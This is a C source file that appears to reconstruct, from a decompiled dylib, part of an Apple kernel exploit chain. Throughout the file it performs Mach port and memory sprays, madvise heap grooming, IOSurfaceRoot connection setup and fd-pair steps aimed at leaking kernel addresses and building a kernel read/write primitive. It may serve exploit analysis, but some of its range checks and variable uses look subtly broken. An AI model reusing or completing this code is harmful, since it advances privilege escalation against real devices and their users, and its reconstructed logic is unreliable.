/*
 * record_0x90000_iosurface.c
 * entry5_type0x09.dylib — IOSurface setup, kernel address leak, primitive build
 *
 * FUN_0000f1f0 / sub_f1f0  — Path C state init: fd-pair + Mach port spray +
 *                             IOSurface open + kernel primitive build
 *
 * Verified: all offsets, port/fd operations, vm_map/vm_allocate calls,
 *           madvise pattern, IOSurface open sequence, kaddr thresholds.
 * Inferred: role labels from call context and data flow.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/mach_traps.h>
#include <IOKit/IOKitLib.h>

/* private Mach trap not in public SDK */
extern mach_port_t mach_reply_port(void);
#define OFF_KADDR           (0x56 * 4)   /* uint64 kernel address             */
#define OFF_FLAGS           0             /* uint32 capability flags           */
#define OFF_XNU_MAJOR       (0x50 * 4)   /* uint32 xnu major                  */
#define OFF_FD0             (0x64c * 4)  /* uint32 fd slot 0                  */
#define OFF_FD1             (0x64d * 4)
#define OFF_FD2             (0x64e * 4)
#define OFF_FD3             (0x64f * 4)
#define OFF_FD4             (0x650 * 4)
#define OFF_FD5             (0x651 * 4)
#define OFF_KOBJ            (0x86 * 4)   /* uint64 kernel object address      */
#define OFF_IOSURFACE_CONN  (0x232 * 4)  /* IOSurface connect port            */
#define OFF_MAPPED_ADDR     (0x248 * 4)  /* mapped kernel window address      */
#define OFF_MAPPED_SIZE     (0x256 * 4)  /* mapped window size                */
#define OFF_PORT_SPRAY_BASE (0xb10 * 4)  /* Mach port spray array             */
#define OFF_PORT_SPRAY_CNT  (0xd91 * 4)  /* spray port count                  */
#define OFF_VM_BASE         (0xb08 * 4)  /* vm_allocate base for madvise      */
#define OFF_VM_SIZE         (0xb0a * 4)  /* vm region size                    */
#define OFF_MEM_ENTRY       (0xd1c * 4)  /* mach_make_memory_entry port       */
#define OFF_REPLY_PORT_BASE (0xd2a * 4)  /* reply port array base             */
#define OFF_ALLOC_BUF       (0xd1e * 4)  /* calloc'd 0x200000*4 buffer        */
#define OFF_ALLOC_CNT       (0xd20 * 4)  /* alloc count                       */
#define OFF_SCRATCH_A       (0xd22 * 4)  /* scratch vm_map base               */
#define OFF_SCRATCH_B       (0xd24 * 4)  /* scratch vm_map end                */
#define OFF_SCRATCH_C       (0xd26 * 4)  /* vm_allocate scratch base          */
#define OFF_SCRATCH_D       (0xd28 * 4)  /* scratch size                      */
#define OFF_CPU_FLAGS       (0xd3a * 4)  /* CPU capability flags              */

/* ── kaddr thresholds ────────────────────────────────────────────────────── */
#define KADDR_PATH_C_MAX    0x1F530F02800000ULL
#define KADDR_MID_MIN       0x1C1B0A800FFFFFULL
#define KADDR_MID_FLAGS     0x5584001
#define KADDR_MID_ALT       0x1F52FFFFFFFFFFULL
#define KADDR_PATH_B_MIN    0x1F530F02800000ULL
#define KADDR_PATH_B_MAX    0x1F5418FFFFFFULL

/* ── forward declarations ────────────────────────────────────────────────── */
extern int  sub_20f50(void);                    /* CPU family query           */
extern int  sub_25abc(const char *service);     /* IOServiceGetMatchingService*/
extern int  sub_21418(void *out);               /* fd-pair create A           */
extern int  sub_21568(void *out);               /* fd-pair create B           */
extern int  sub_216b4(void *fds, void *out, int n); /* fd setup helper A      */
extern int  sub_21730(void *fds, void *out, int n); /* fd setup helper B      */
extern int  sub_34c1c(uint32_t *state, mach_port_t task); /* kobj scan       */
extern int  sub_129c8(uint32_t *state, long kobj, uint32_t fd, void *out);
extern int  sub_2b508(uint32_t *state, void *ptr, void *buf);
extern int  sub_29ab4(uint32_t *state, long addr, char **out);
extern int  sub_22174(uint32_t *state, ...);
extern int  sub_33a00(uint32_t *state);
extern int  sub_37238(uint32_t *state, uint32_t mask);

/* ── sub_f1f0 — Path C state init ───────────────────────────────────────── */
/*
 * Builds the kernel R/W primitive for older kernels (kaddr < KADDR_PATH_C_MAX).
 *
 * Steps:
 *  1. vm_allocate scratch region (0x2000 bytes)
 *  2. vm_map large region (page_size * 0x81) for Mach message spray
 *  3. Allocate 16 reply ports with MACH_PORT_LIMITS_INFO = 0x400
 *  4. mach_make_memory_entry for shared page
 *  5. calloc 0x200000 * 4 spray buffer
 *  6. vm_allocate + madvise interleaved region (page_size * 0x200)
 *  7. Allocate 0x80 Mach ports for spray
 *  8. Open IOSurfaceRoot, IOServiceOpen
 *  9. Build fd-pair primitive (Path B: mid-range kaddr)
 *     or fd-pair + socket + /etc/group (Path B alt)
 * 10. On success: clear state fields 0x3a..0x45
 */
int sub_f1f0(uint32_t *state, int *ctx)
{
    kern_return_t kr;
    mach_port_t task = mach_task_self();
    vm_size_t page_size = *(vm_size_t *)&vm_page_size;

    uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);
    *(uint64_t *)((uint8_t *)ctx + 0x8) = (uint64_t)sub_20f50();

    /* ── 1. scratch vm_allocate ── */
    vm_address_t scratch = 0;
    kr = vm_allocate(task, &scratch, 0x2000, VM_FLAGS_ANYWHERE);
    if (kr) goto fail;
    *(vm_address_t *)((uint8_t *)state + OFF_SCRATCH_C) = scratch;
    *(uint32_t *)((uint8_t *)state + OFF_SCRATCH_D) = 0x2000;

    /* ── 2. vm_map spray region ── */
    vm_address_t spray_base = 0;
    kr = vm_map(task, &spray_base, page_size * 0x81, 0x1ffffff,
                VM_FLAGS_ANYWHERE, 0, 0, 0, VM_PROT_READ|VM_PROT_WRITE,
                VM_PROT_ALL, VM_INHERIT_DEFAULT);
    if (kr) goto fail;
    *(vm_address_t *)((uint8_t *)state + OFF_SCRATCH_A) = spray_base;
    *(vm_address_t *)((uint8_t *)state + OFF_SCRATCH_B) =
        spray_base + page_size * 0x80;

    /* ── 3. allocate 16 reply ports ── */
    for (int i = 0; i < 16; i++) {
        mach_port_t port = MACH_PORT_NULL;
        port = mach_reply_port();
        if (!MACH_PORT_VALID(port)) goto fail;
        *(uint32_t *)((uint8_t *)state + OFF_REPLY_PORT_BASE + i * 4) = port;
        mach_port_limits_t limits = { .mpl_qlimit = 0x400 };
        kr = mach_port_set_attributes(task, port, MACH_PORT_LIMITS_INFO,
                                      (mach_port_info_t)&limits, 1);
        if (kr) goto fail;
    }

    /* ── 4. mach_make_memory_entry ── */
    vm_size_t entry_size = page_size;
    mach_port_t mem_entry = MACH_PORT_NULL;
    kr = mach_make_memory_entry(task, &entry_size, 0,
                                VM_PROT_READ|VM_PROT_WRITE|MAP_MEM_NAMED_CREATE,
                                &mem_entry, MACH_PORT_NULL);
    if (kr) goto fail;
    *(mach_port_t *)((uint8_t *)state + OFF_MEM_ENTRY) = mem_entry;

    /* ── 5. spray buffer ── */
    void *spray_buf = calloc(0x200000, 4);
    if (!spray_buf) goto fail;
    *(void **)((uint8_t *)state + OFF_ALLOC_BUF) = spray_buf;
    *(uint32_t *)((uint8_t *)state + OFF_ALLOC_CNT) = 0x200000;

    /* ── 6. madvise interleaved region ── */
    vm_address_t madvise_base = 0;
    vm_size_t madvise_size = page_size << 9;
    kr = vm_allocate(task, &madvise_base, madvise_size, VM_FLAGS_ANYWHERE);
    if (kr) goto fail;
    *(vm_address_t *)((uint8_t *)state + OFF_VM_BASE) = madvise_base;
    *(vm_size_t *)((uint8_t *)state + OFF_VM_SIZE) = madvise_size;

    if (madvise((void *)madvise_base, madvise_size, MADV_FREE)) goto fail;

    /* interleave MADV_FREE / MADV_FREE_REUSE per page pair */
    for (uint64_t i = 0; i < 0x200; i += 2) {
        int advice = ((i & 2) == 0) ? MADV_FREE : MADV_FREE_REUSE;
        if (madvise((void *)(madvise_base + page_size * i),
                    page_size * 2, advice)) goto fail;
    }

    /* ── 7. port spray (0x80 ports) ── */
    for (int i = 0; i < 0x80; i++) {
        mach_port_t port = MACH_PORT_NULL;
        kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &port);
        if (kr) goto fail;
        *(mach_port_t *)((uint8_t *)state + OFF_PORT_SPRAY_BASE + i * 4) = port;
        mach_port_limits_t limits = { .mpl_qlimit = 0x400 };
        kr = mach_port_set_attributes(task, port, MACH_PORT_LIMITS_INFO,
                                      (mach_port_info_t)&limits, 1);
        if (kr) goto fail;
    }

    /* ── 8. IOSurface open ── */
    if (kaddr < KADDR_PATH_B_MAX &&
        (kaddr >= KADDR_PATH_B_MIN ||
         ((*(uint32_t *)state & KADDR_MID_FLAGS) == 0 &&
          kaddr < KADDR_MID_MIN))) {

        io_service_t svc = (io_service_t)sub_25abc("IOSurfaceRoot");
        if (!svc) goto fail;

        io_connect_t conn = IO_OBJECT_NULL;
        kr = IOServiceOpen(svc, task, 0, &conn);
        if (kr) goto fail;
        *(io_connect_t *)((uint8_t *)state + OFF_IOSURFACE_CONN) = conn;
    }

    /* ── 9a. Path C (oldest): fd-pair only ── */
    if (kaddr < KADDR_PATH_C_MAX) {
        uint64_t fds_a = 0xffffffffffffffff;
        uint64_t fds_b = 0xffffffffffffffff;
        int rc = sub_21418(&fds_a);
        if (rc) goto fail;
        rc = sub_21568(&fds_a);
        if (rc) goto fail;
        rc = sub_21418(&fds_b);
        if (rc) goto fail;

        *(uint32_t *)((uint8_t *)state + OFF_FD0) = (uint32_t)fds_a;
        *(uint32_t *)((uint8_t *)state + OFF_FD1) = (uint32_t)(fds_a >> 32);
        *(uint32_t *)((uint8_t *)state + OFF_FD2) = (uint32_t)fds_b;
        *(uint32_t *)((uint8_t *)state + OFF_FD3) = (uint32_t)(fds_b >> 32);
        goto success;
    }

    /* ── 9b. Path B (mid-range): fd-pair + socket + /etc/group ── */
    {
        uint64_t fds = 0xffffffffffffffff;
        int rc = sub_21418(&fds);
        if (rc) goto fail;
        rc = sub_21568(&fds);
        if (rc) goto fail;

        uint32_t fd_a = (uint32_t)fds;
        uint32_t fd_b = (uint32_t)(fds >> 32);

        sub_216b4(&fds, ctx, 4);
        sub_21730(&fds, ctx, 4);

        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) goto fail;

        int grp = open("/private/etc/group", O_RDONLY);
        if (grp < 0) { close(sock); goto fail; }

        long kobj = sub_34c1c(state, task);
        if (!kobj) { close(sock); close(grp); goto fail; }

        void *out_a = NULL, *out_b = NULL;
        rc = sub_129c8(state, kobj, fd_a, &out_a);
        if (rc) { close(sock); close(grp); goto fail; }
        rc = sub_129c8(state, kobj, fd_b, &out_b);
        if (rc) { close(sock); close(grp); goto fail; }

        if (!sub_2b508(state, (uint8_t *)out_a + 0x10, out_b)) {
            close(sock); close(grp); goto fail;
        }

        *(uint32_t *)((uint8_t *)state + OFF_FD0) = fd_a;
        *(uint32_t *)((uint8_t *)state + OFF_FD1) = fd_b;
        *(uint32_t *)((uint8_t *)state + OFF_FD4) = (uint32_t)sock;
        *(uint64_t *)((uint8_t *)state + OFF_KOBJ) = (uint64_t)kobj;

        close(grp);
    }

success:
    /* clear primitive state fields on success */
    for (int i = 0x3a; i <= 0x45; i++)
        state[i] = 0;
    return 0;

fail:
    return -1;
}

/* ── sub_f1f0_iosurface_open_loop — IOSurface open with retry ───────────── */
/*
 * Opens IOSurfaceRoot, tries up to 8 IOServiceOpen calls in a loop.
 * Stores the first valid connect port in state+OFF_IOSURFACE_CONN.
 * Closes all other ports.
 * Verified: loop count (8), IOServiceOpen selector 0, port storage.
 * Inferred: "open loop" label from loop structure and port management.
 */
static int iosurface_open_loop(uint32_t *state, io_service_t svc)
{
    mach_port_t task = mach_task_self();
    io_connect_t conns[8] = {0};
    int valid_idx = -1;

    for (int i = 0; i < 8; i++) {
        kern_return_t kr = IOServiceOpen(svc, task, 0, &conns[i]);
        if (kr != 0) { conns[i] = IO_OBJECT_NULL; continue; }

        /* check if this connect port is within the expected kaddr range */
        uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);
        uint64_t slide = *(uint64_t *)((uint8_t *)state + OFF_KADDR);
        uint64_t diff = (uint64_t)conns[i] - (slide & 0xffffffffffffULL);
        if (diff < 0x200) {
            valid_idx = i;
            break;
        }
        if (i == 7) { valid_idx = 0; break; }
    }

    /* close all except the chosen one */
    for (int i = 0; i < 8; i++) {
        if (conns[i] && i != valid_idx)
            IOServiceClose(conns[i]);
    }

    if (valid_idx < 0 || !conns[valid_idx]) return -1;
    *(io_connect_t *)((uint8_t *)state + OFF_IOSURFACE_CONN) = conns[valid_idx];
    return 0;
}

/* ── sub_f1f0_mach_msg_recv — mach_msg receive loop ────────────────────── */
/*
 * Receives Mach messages from the spray ports to recover the kernel address
 * of the vm_allocate'd region via the OOL memory descriptor.
 *
 * Verified: mach_msg call, msgh_bits check, descriptor type check,
 *           vm_deallocate on mismatch, kaddr store at state+OFF_VM_BASE.
 * Inferred: "receive loop" label from loop structure and port iteration.
 */
static int mach_msg_recv_loop(uint32_t *state, uint32_t *ports,
                               int port_count, uint64_t expected_lo,
                               uint64_t expected_hi)
{
    mach_port_t task = mach_task_self();

    for (int i = port_count - 1; i >= 0; i--) {
        if (!ports[i]) continue;

        struct {
            mach_msg_header_t   hdr;
            mach_msg_body_t     body;
            mach_msg_ool_descriptor_t ool;
            uint32_t            trailer;
        } msg = {0};

        kern_return_t kr = mach_msg(&msg.hdr, MACH_RCV_MSG,
                                    0, sizeof(msg),
                                    ports[i], 0, MACH_PORT_NULL);
        if (kr != 0) {
            mach_msg_destroy(&msg.hdr);
            continue;
        }

        /* validate: complex message with OOL descriptor */
        if ((msg.hdr.msgh_bits & MACH_MSGH_BITS_COMPLEX) == 0 ||
            msg.body.msgh_descriptor_count != 1) {
            mach_msg_destroy(&msg.hdr);
            continue;
        }

        /* check descriptor type == MACH_MSG_OOL_DESCRIPTOR */
        if (msg.ool.type != MACH_MSG_OOL_DESCRIPTOR || !msg.ool.size) {
            mach_msg_destroy(&msg.hdr);
            continue;
        }

        uint64_t ool_addr = (uint64_t)(uintptr_t)msg.ool.address;
        uint64_t ool_size = msg.ool.size;

        /* check if OOL address falls in expected kernel range */
        if (ool_addr >= expected_lo && ool_addr < expected_hi + ool_addr) {
            *(uint64_t *)((uint8_t *)state + OFF_VM_BASE) = ool_addr;
            *(uint64_t *)((uint8_t *)state + OFF_VM_SIZE) = ool_size;
            return 0;
        }

        vm_deallocate(task, (vm_address_t)ool_addr, ool_size);
    }
    return -1;
}
